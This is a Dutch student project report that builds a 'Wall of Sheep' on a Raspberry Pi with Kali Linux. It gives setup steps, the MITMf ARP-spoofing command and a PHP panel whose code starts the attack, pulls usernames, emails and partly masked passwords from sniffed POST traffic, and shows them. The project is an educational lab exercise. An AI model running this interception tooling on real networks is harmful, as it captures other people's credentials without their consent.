#The making of the Wall of Sheep

##The early beginning

###Opdracht

In ons derde jaar op AP Hogeschool wordt er van ons verwacht een pakket te maken die automatisch het netwerk snift opzoek naar wachtwoorden. We doen dit door middel van een rasberry pi. Als we een wachtwoord vinden zal dit weergegeven worden via een server op het scherm. We hadden hiervan al een naslag werk van gekregen van studenten van vorig jaar. Na het lezen van hun project zijn we tot de conclusie gekomen dat ze het enkel werkend hebben gekregen door middel van een hub. Ons doel is om dit via Wifi te doen. Wij maken deze opdracht in groepjes van twee. 
Het doel van dit project is dat onze kennis wordt getest en dat we op zelfstandige basis een project kunnen uitvoeren.

In ons project hebben we een aantal doelstellingen. Een zeer belangrijke hiervan is het plannen en het verdelen van taken. We werken in een groep van twee. Hier moet zeker de nodige planning gebeuren willen we tot een succesvolle project komen. We leren hier bepaalde technieken voor die ons hierbij kunnen helpen!
In ons latere leven zullen we hier ook mee te maken krijgen. We zullen ook vindingrijk moeten zijn bij het oplossen van problemen. Niet alles gaat van de eerste keer en we zullen zeker eens een probleem hebben en dat moeten we succesvol kunnen oplossen. Dit zal tevens belangrijk zijn in ons dagelijks leven. Onze werkhouding en ons gedrag binnen de groep en tegenover derden is ook een belangrijke doelstelling!

Het algemeen doel van ons project is dat we in een werkelijke situatie ervaring opdoen. 
In dit dossier vindt u de schriftelijke neerslag van en de extra informatie van onze taken. Wij wensen jullie nog veel leesplezier.

Bart Kerstens, Arne Schoonvliet


###Verloop van de opdracht

Onze eerste bedoeling was om het netwerk passief te sniffen op packetten in de lucht. Uiteindelijk hebben ze dit niet kunnen doen gezien ze ettercap niet werkend kregen in promiscous mode. Daarna hebben we geprobeerd om een reverse ARP uit te voeren op het netwerk. Dit hebben we een aantal weken geprobeerd zonder succes. Ettercap was niet in staat om het netwerk te sniffen en dit naar een bestand te loggen. We hebben hier spijtig genoeg heel veel tijd mee verloren en nog steeds het probleem niet gevonden. Op aanraden van Brecht Carlier zijn we overgestapt naar Man-In-The-Middle-Framework. Dankzij deze overstap hebben met success het netwerk kunnen sniffen. Hierdoor waren we in staat om alle nuttige info die we konden gebruiken over te zetten in een logfile. Om deze logfile uit te lezen hebben we een php script geschreven dat op de Apache server van de Raspberry pi draait. Indien men naar het adres van de pi surft kan men de ARP aanval starten, de logs binnenhalen van de aanval of de Raspberry pi uitschakelen. Hoe we dit allemaal gerealiseerd hebben word hieronder uitgelegd.

###Benodigdheden

* Accesspoint/router die ons netwerk voorsteld
* Raspberry pi ( onze hacking module )
* Target laptop waar we het verkeer van afluisteren

###Software die nodig was

####Laptop
* putty (shh)
* tightvnc (remote desktop voor Raspberry pi)

####Raspberry pi
* Debian (linux distributie, KALI)
* ettercap ( vervangen door MITMF)
* tightvnc ( grafische weergave/ remote desktop )
* Apache
* Man-in-the-middle-framework

##Let's get to work

#### Debian image op SD-card plaatsen
Om dit te doen maken we gebruik van een tool voor de image op de SD-Card te zetten. We hebben ervoor gekozen om Kali linux op onze Raspberry pi te zetten. Dit is een linux distributie dat men kan gebruiken als tool voor het pentesten en sniffen van een netwerk. Men kan deze image file vinden op de kali website. 
![Printscreen Tool](http://a.fsdn.com/con/app/proj/win32diskimager/screenshots/win32-imagewriter.png)

Wanneer dit gelukt is kunnen we de SD-card in de Rasberry pi plaatsen en hem booten met de nieuwe image. We moeten natuurlijk de Pi op een scherm aansluiten en zo ook een muis en toetsenbord. 

### Next step
Als de Pi succesvol geboot is kunnen we er dingen op beginnen instellen:
* ssh instellen zodat we toegang hebben via putty
* Remote desktop instellen zodat we het bureaublad kunnen zien (tightVNC)
* Ettercap installeren (text based)
* Apache (voor script en log op te laten verschijnen)
* Python mailer script voor IP doorsturen

De meesten van deze tools moeten allemaal eerst gedownload worden, dit wil weggen dat de pi op een netwerk met internet verbonden moet zijn.
Om dit te kunnen realiseren wordt op een laptop de internet verbinding gedeeld door hem als DHCP in te stellen, hierdoor ontvangt de pi een IP adres.

Om dit te kunnen realiseren zorgen we ervoor dat het school netwerk zijn internet via wifi doorgesluist word naar de lan poort. Je doet dit door naar netwerkcentrum te gaan dan naar adapters om uiteindelijk naar de eigenschappen van de wifi adapter te gaan. In de tab delen kan men toestaan dat andere netwerkgebruikers toegang hebben tot internet via zijn netwerk. Er wordt een DHCP server gestart in windows en zal dus ook een IP address uitdelen aan de PI. 

![wifi](http://i.imgur.com/btWxHSI.png)

#### Bepalen IP Raspberry Pi
We weten niet welk IP adres de Pi heeft gekregen van de DHCP server. We weten dat het in het 192.168.137.* netwerk is. Dus we gaan een ip scan doen met nmap. [Nmap](https://nmap.org/download.html) kan je hier downloaden. Door middel van dit commando

```
nmap -sn 192.168.137.*
```

Hierna weten we het IP adres van de Pi en kunnen we toegang krijgen via ssh.
#### tightvnc
Soms is het eenvoudiger om via de gui te werken op de Pi. Maar we hebben niet altijd een scherm tot onze beschikking en laat staan genoeg hdmi naar dvi converters. We moesten dus opzoek naar een alternatief. Na wat zoeken zijn we tot de conclusie gekomen dat we VNC (Virtual network computing) nodig hebben. Op de officiele website staat een mooie tutorial hoe je tightvnc installeert en gebruikt. 
```
sudo apt-get install tightvncserver
```
Hiermee installeer je tightvnc

```
tightvncserver
```
Hiermee start je de server

Als je daarna een client download op je windows machine heb je nu toegang tot een virtueel scherm!
#### Ettercap
*software die op de Pi geïnstalleerd word*

Ettercap is een open source tool voor man in the middle aanvallen op een netwerk. Het heeft ontzettend veel opties in verband met sniffing van verschillende protocollen. Ons doel was om deze tool te gebruiken om het wifi netwerk te scannen (al dan niet met arp poisoning) om zo wachtwoorden te verkrijgen van de mensen die op het netwerk zitten. Uit het naslag werk van vorig jaar konden we afleiden dat het werken met ettercap niet moeilijk is. Maar in de praktijk bleek dit toch anders te zijn. We kregen het niet voor elkaar om ettercap te laten sniffen van het netwerk. Na hulp van de leerkracht te vragen en ook aan vrienden hadden we de moed al een beetje opgegeven. Na aanraden van Brecht Carlier zijn we in de laatste weken gaan kijken naar een andere man in the middle tool. 

##### Installatie ettercap
Installatie van ettercap was eenvoudig. Met onderstaande vier lijnen was ettercap geïnstalleerd

```
sudo apt-get install zlib1g zlib1g-dev 
sudo apt-get install build-essential 
sudo apt-get install ettercap 
sudo apt-get install ettercap-text
```
#### Mailer script
Om ons werk te vergemakkelijken hebben we een python script gevonden dat het IP adres van de Pi doorstuurt naar een mailadres van ons tijdens start up. Dit werkt natuurlijk enkel als de pi toegang heeft tot het internet. Maar op deze manier moeten we dus niet steeds de nmap tool gebruiken opzoek naar welk IP de Pi heeft gekregen. Als we het IP hebben kunnen we gemakkelijk via putty een ssh verbinding maken naar de Pi.

![*Het script*](http://i63.tinypic.com/14y78jo.png)

Om ervoor te zorgen dat het python scriptje wordt uitgevoerd bij boot up hebben we gebruik gemaakt van de crontab. Crontab is een simpele text file die een lijst van commando's uitvoert op een bepaald tijdstip of in ons geval op boot up. In de file staat dit commando.

```
@reboot python /home/InfSec/mailer.py
```

####Man-in-the-middle-framework (mitmf)
Zoals eerder vermeld zijn we overgeschakeld van ettercap naar mitmf. Dit had als voordeel dat we hier wel ons netwerk wel konden sniffen. Het grootste nadeel was dat voor ettercap een php script was die voor ons de wachtwoorden en usernames uit de gesnifte data zal filteren. Voor mitmf bestond dit niet en moesten we dit zelf doen. Bart heeft hier ontzettend goed werk geleverd en het resultaat mag er zeker zijn!


Mitmf one-stop-shop voor man-in-the-middle en netwerk aanvallen. Het framework krijgt constant updates en verbeteringen voor bestaande aanvallen.

Normaal was dit framework ontworpen voor belangrijke tekortkomingen bij ettercap op te vangen. Op github is nu een volledige repo toegewijd aan een van nul opgebouwd framework. Het framework is ook zeer eenvoudig te gebruiken.

Instalatie van mitmf is eenvoudig zoals hieronder kan zien.
```
apt-get install mitmf
```

##De volgende stap

Nu we alle services en software hebben op onze Raspberry gaan we hem instellen

###Putty
Eerst maken we verbinding met de Raspberry pi. Dit doen we door onze email na te kijken, hier krijgen we een mail met het IP van de Raspberry pi eenmaal deze is opgestart. Vervolgens gebruiken we dit IP-addres om te verbinden via putty.

![](http://i63.tinypic.com/11hfjo4.jpg)

Dan inloggen als admin. Inloggegevens:  
* User: root 
* password: toor

###tightvnc 
Natuurlijk willen we iets zien buiten een commando scherm, daarom starten we tightvncserver op.
![](http://i66.tinypic.com/wv1gmq.png)

##Schrijven van de code


###Apache
Nu hebben we volledige toegang tot de Raspberry pi en kunnen we verder met de instellingen. 
Om onze logs weer te geven gaan we deze op een php pagina posten. Hiervoor moeten we eerst de apache server die we daarstraks hebben gedownload starten. 

```linux
service apache2 start
```
Elke keer als de Raspberry pi opstart moeten we de server ook terug moeten opstarten. Omdat dit in de praktijk moeilijk gaat laten we de apache server ook opstarten wanneer de pi klaar is met booten. Dit bespaart ons veel tijd en moeite uit en kunnen we direct verbinden maken met de apache server zonder eerst te moeten verbinden met de site.

```linux
update-rc.d apache2 defaults
```
###Index.PHP

Als we nu naar de site zouden gaan die op de php server staat is deze leeg. We gaan alles in php schrijven om de aanval vanuit deze pagina te kunnen doen. Dit houd in: een *[START](#START)* knop om de aanval te starten, een *[LOG](#LOG)* knop waar we de log bestanden mee opvragen en een *[STOP](#STOP)* knop om de aanval te stoppen. Tevens laat de pagina ook de status van het programma zien. Hierdoor weet je of het af staat, aan het opstarten is, of al bezig is.
![](http://i68.tinypic.com/20ti0qb.png)
![](http://i68.tinypic.com/14e04rr.png)
![](http://i65.tinypic.com/2yorhqs.png)

####HTML & PHP

Knoppen waar we alle functies mee gaan uitvoeren.
Bevat ook de status van het programma.
De status van het programma kijken we na door een gefilterde search te doen naar onze draaiende processen op de Rapberry pi.
Dit word gedaan door de *$return* uit te voeren en de result in en IF-/ELSEIF-statement te gooien.
Indien deze niets opleveren kunnen we er vanuit gaan dat de service niet aan het draaien is. Indien we een S en R optvangen weten we dat het programma aan het opstarten is. Wanneer het programma volledig is opgestart zullen we een S en Sl ontvangen van de proccess tabel.

```
<form method="POST" action=''>
<input type = submit name='ARP' value = "Start ARP">
</form> 
Status: <?php
$return = "ps aux | grep '[/]mitmf' | awk '{print $8}'";
exec($return,$op);

if($op[0] == "S" && $op[1] == "Sl"){ echo "Programm running";}
elseif($op[0] == "S" && $op[1] == "R"){echo "Programm launching";}

else{echo "service not running";}

?>

</br>

<form method="GET" action=''>

<input type = submit name='LOG' value = "GET LOG">
</br>
<input type = submit name='STOP' value = "STOP">

</form> 

```

####PHP 

#####Variabelen

In het programma hebben we enkele variabelen nodig die we op voorhand instellen. Deze zijn onder andere 
* $filename: locatie koppie van de originele log file van mitmf
* $mitmffile: locatie van de originele log file van mitmf
* $stop: commando voor de mitmf aanval te stoppen

```
$filename = '/var/www/html/logfile.log';
$mitmffile = '/usr/share/mitmf/logs/mitmf.log';
$stop = "sudo kill $(ps aux | grep '[m]itmf' | awk '{print $2}')";
```
#####START ARP<a name ="START">

Om onze aanval uit te voeren moeten we enkel op de *START ARP* knop duwen. Wanneer dit gebeurd wordt de methode *runhack()* in ons programma aangeroepen. 

```
if(isset($_POST['ARP']))
{
runHack();
}
```

Deze methode zal eerst de Raspberry pi zijn default gateway opvragen. Deze is een variabele die we nodig hebben om de aanval te kunnen starten. We steken hem daarom in *$default*.
```
function runHack()
{
exec('route -n | cut -d" " -f10',$test);
$default = $test[2];
```
Vervolgens gaan we nagaan of er nog een logfile is van voorgaande aanvallen. Omdat deze informatie outdated kan zijn moeten we deze eerst verwijderen.
```
if(isset($_POST['ARP']))
if(file_exists("/usr/share/mitmf/logs/mitmf.log"))
{
shell_exec("sudo rm /usr/share/mitmf/logs/mitmf.log");
}
```
Nu alle voorbereidingen getroffen zijn gaan we het commando voor de aanval ingeven. Dit slaan we op in de *$commando* variablele. Hierna gaan we een *shell_exec($command)* uitvoeren om  de aanval te starten. 
```
$command = 'sudo mitmf -i eth0 --gateway '.$default.' --spoof --arp';
shell_exec($command);
}
```
Het $commando bevat het volgende:
* sudo: toevoegen om www-data als admin te runnen
* mitmf: service die de aanval uitvoert
* -i: de interface waar we deze gaan uitvoeren
* --gateway: de gateway die we gaan overnemen
* --spoof: vervalsen van identiteit
* --arp: type van de aanval die we uitvoeren

Wat gebeurd er nu eigenlijk met dit commando hieronder. 
```
mitmf -i eth0 --gateway '.$default.' --spoof --arp
```
We roepen mitmf aan en zeggen dat deze moet gaan spoofen op interface eth0. Daarna stellen we de default gateway. Als laatste gaan we instellen dat we arp spoofing gaan doen. Wat is arp spoofing nu eigenlijk. De aanvaller, in ons geval de Pi, zal arp pakketjes sturen op het netwerk. Het doel is om de Pi zijn mac address te linken aan een IP adres van een andere host, in ons geval de default gateway. Dit zorgt ervoor dat de data bedoeld voor de default gateway naar onze Pi komt. 

![arpspoofing](https://upload.wikimedia.org/wikipedia/commons/3/33/ARP_Spoofing.svg)

Voor de aanval gestart werd zagen onze draaiende processen als volgend uit:
![](http://i66.tinypic.com/zml6z6.png)
Na de start van de aanval zal de status van de pagina veranderen van: *service not running* naar *programm launching*.
Onze proces tabel ziet er dan als volgend uit:
![](http://i67.tinypic.com/6qux6x.png)
Omdat we het op een trage Raspberry pi runnen heeft het programma ongeveer 40 seconden nodig om op te starten. Als dit gebeurd is zal status op de pagina veranderen van: *programm launching* naar *programm running*. Onze proces tabel ziet er dan als volgend uit:
![](http://i67.tinypic.com/6qux6x.png)
Het programma zal nu all het verkeer dat door de default gateway in het oog houden en wegschrijven naar een logfile.

#####LOG<a name ="LOG">
Omdat we bij de Wall of sheep enkel de gebruikersnaam/mail en wachtwoorden laten zien (en de website) zullen we de grote logfile waar al het verkeer in terecht komt moeten filteren. Dit gebeurd vanaf het moment dat de gebruiker de files opvraagt aan de server. Hieronder vind u een foto van een ongefilterd logbestand.
![](http://i67.tinypic.com/34yczn9.png)

```
if(isset($_GET['LOG']))
{
WallofSheep($filename);
}
```
We geven hier de variabele *$filename* aan mee omdat we deze nodig hebben in onze methode.
Hier gaan we nakijken of we nog een logfile hebben van en vorige keer en deze verwijderen moest dit het geval zijn. Hier op volgend gaan we de originele log file kopiëren en in de huidige map plaatsen. Dit staat ons toe om bewerking op de lokale log file uit te voeren. De lokale logfile wordt gefilterd op de keywords *POST* en *pass*. Dit doen we omdat we hierdoor alle POSTs er uit kunnen halen en alle zinnen met een wachtwoord in. Deze zetten we in een andere file net de naam *pass2.txt* . Deze ziet er als volgt uit:
![](http://i64.tinypic.com/25886xf.png)
```
function WallofSheep($filename){

if(file_exists($filename))
{
exec("rm logfile.log");
}
exec("cp /usr/share/mitmf/logs/mitmf.log logfile.log");
exec('cat logfile.log | grep "POST\|pass" | tee "pass2.txt"');
```
Nu moeten we alle zinnen met informatie uit de file *pass2.txt* halen. Dit doen we zodat we enkel de gewenste informatie kunnen laten zien op het log gedeelte van de pagina. Alle zinnen worden in de variabele *$content* gestoken. Vervolgens gaan we onze *better($content)* methode aanroepen en de *$content* hier aan mee geven.
```
$content = file("pass2.txt");
better($content);
}
```

Onze methode gaat een foreach loop doen op alle zinnen die we hebben meegegeven. Van elke zin ($test) wordt gekeken of ze bepaalde keywoorden bevatten. Bij de eerste IF gaan we na of de zin het keywoord *email* bevat. Moest dit het geval zijn gaan we deze zin meegeven aan de *emailinfo($test)* methode. Deze behandeld de zinnen met een email. Voor de rest van de zinnen wordt gekeken of ze het keywoord *POST* bevatten. Deze worden direct weergegeven op het scherm. De andere zinnen bevatten het keywoord *username* en worden behandeld door de methode *userinfo($test)*.
```
foreach($content as $test)
{
if(strpos($test,"email")!== FALSE)
{
emailinfo($test);
}
else {
if(strpos($test,"POST")!== FALSE)
{
echo "<br>". $test;
}
else{
userinfo($test);
}
}
}
}
```
######userinfo($test)
Deze methode gaat uit alle zinnen die hij binnenkrijgt de username en het passwoord uithalen. Gezien we de passwoorden niet volledig zichtbaar willen maken moeten we bepalen hoeveel er zichtbaar mogen zijn. We hebben ervoor gekozen om 2 characters te laten zien en de rest te vervangen door een '*' . Om de info uit de zinnen te halen moeten we weer op keywoorden gaan zoeken en de zin opsplitsen waar een match gevonden wordt. Na veel trail en error hebben we de onderstaand code geschreven.
```
function userinfo($string){

$raw = explode("name",$string); 
$raw2 = explode("=",$raw[1]);
$name = explode("&",$raw2[1]);

$raw = explode("pass",$string); 
$raw2 = explode("=",$raw[1]);
$length = strlen($raw2[1]) - 1;
if(strpos($raw2[1],"&")!== FALSE)
{
$raw2 = explode("&",$raw[1]);
$raw2 = explode("=",$raw2[0]);
$raw2[1]= $raw2[1];
$length = strlen($raw2[1]);

}
$pass = str_pad(substr($raw2[1],0,2),$length,"*");
echo "<br>----------<br>";

echo "Gebruiker:". $name[0] ."<br>";
echo "passwoord:". $pass ."<br>";

echo "<br>----------<br>";

}

```


######emailinfo($test)
Deze methode verschilt niet veel van de boventstaande. Deze zal werken met het keywoord *email* ipv *user*. Sommige sites sturen hun email door en vervangen hier '@' door '%40' . Dit presenseert niet mooi dus vervangen we dit terug door het '@'teken. 
```
function emailinfo($string)
{
$raw = explode("email",$string);
$raw2 = explode("&",$raw[1]);
$raw3 = explode("=",$raw2[0]); //searching for email
$email = str_replace("%40","@",$raw3[1]);

$raw = explode("pass",$string);// searching for password
$raw2 = explode("=",$raw[1]); 
$raw3 = explode("&",$raw2[1]);
$length = strlen($raw3[0]);
$pass = str_pad(substr($raw3[0],0,2),$length,"*");

echo "<br>----------<br>";
echo "email: " .$email."<br>";
echo "passwoord: " .$pass."<br>";
echo "<br>----------<br>";
 
}

```
Een log op de site ziet er als volgend uit:
![](http://i65.tinypic.com/2yorhqs.png)


#####STOP<a name ="STOP">
Om de aanval te stoppen hoeft de gebruiker enkel op de stop knop te duwen. Bovenaan in de variabelen stond het commando ingesteld on de juiste processen te zoeken. Als deze gevonden worden returnen we de *pids*  en wordt een *kill* command hier op worden uitgevoerd.  
```
$stop = "sudo kill $(ps aux | grep '[m]itmf' | awk '{print $2}')";
```

```
if(isset($_GET['STOP']))
{
exec($stop);
}
```
